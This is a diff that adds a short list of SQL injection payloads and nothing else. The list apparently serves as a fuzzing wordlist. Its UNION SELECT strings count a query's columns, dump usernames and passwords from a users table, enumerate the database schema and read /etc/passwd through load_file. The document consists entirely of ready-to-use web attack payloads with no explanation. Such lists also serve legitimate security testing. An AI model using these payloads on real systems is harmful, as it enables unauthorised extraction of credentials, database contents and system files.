@@ -1,0 +1,10 @@
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL,NULL--
+1' UNION SELECT username,password FROM users--
+1' UNION SELECT table_name,column_name FROM information_schema.columns--
+1' UNION SELECT schema_name FROM information_schema.schemata--
+1' UNION SELECT load_file('/etc/passwd')--
+1" UNION SELECT NULL,NULL--
+1" UNION SELECT NULL,NULL,NULL--
